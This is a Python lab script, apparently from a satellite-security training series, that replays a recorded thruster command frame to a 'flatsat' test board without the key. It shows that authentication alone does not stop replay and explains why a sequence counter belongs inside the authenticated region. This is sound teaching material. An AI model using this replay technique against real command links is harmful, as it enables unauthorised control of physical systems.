#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 05_replay_usb.py -- send a command you cannot construct, by reusing one that
# was already sent.
#
# The cryptography is working correctly here, and that is the uncomfortable
# part. It proves the frame came from a holder of the key, and it did. What it
# does not prove is that the frame is FRESH, and freshness is a separate
# property that needs separate machinery: a counter inside the authenticated
# region, and a receiver that refuses to go backwards.
#
# You need no key and no command map for this. You need a recording.
#
# Expected: the same state change happens twice from one capture, and the
# sequence counter tells on you.

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, TC_GET_STATUS, TC_SET_THRUSTER,  # noqa: E402
                     build_tc, frame, hexdump)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--power", type=int, default=0x80)
    ap.add_argument("--times", type=int, default=10,
                    help="how many extra times to resend the same bytes")
    ap.add_argument("--seq", type=int, default=41)
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()

    # The frame an operator would have sent. Built once, then treated as a
    # recording: from here on it is opaque bytes that get resent unchanged.
    captured = build_tc(TC_SET_THRUSTER, bytes([0, args.power & 0xFF]),
                        seq=args.seq, encrypt=not args.cleartext)

    print("[*] the captured frame, byte for byte:")
    print(hexdump(captured))
    print("[*] from here on it is opaque. No key is used and none is needed.")

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. state before ===")
        fsat.send(TC_GET_STATUS, b"", seq=1, listen=1.2)

        print("\n=== 2. the operator's command, as recorded ===")
        fsat.send_raw(captured, listen=1.0)

        print("\n=== 3. put the board back, so the second effect is unambiguous ===")
        fsat.send(TC_SET_THRUSTER, bytes([0, 0]), seq=2, listen=1.0)

        print("\n=== 4. the same bytes again. Nothing was rebuilt ===")
        fsat.send_raw(captured, listen=1.0)
        fsat.send(TC_GET_STATUS, b"", seq=3, listen=1.2)

        print(f"\n=== 5. and {args.times} more times. Watch the sequence count ===")
        for i in range(args.times):
            fsat.send_raw(captured, listen=0.25)
            time.sleep(0.05)
        fsat.send(TC_GET_STATUS, b"", seq=4, listen=1.2)

    print("\nThe counter never moved, because the frame never changed. That is "
          "the whole detection,\nand it is why the counter has to live inside "
          "the authenticated region: outside it, the attacker edits it.")
    print("\nWhat the sensor should have shown: the same bytes twice, and a "
          "sequence counter that went backwards.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
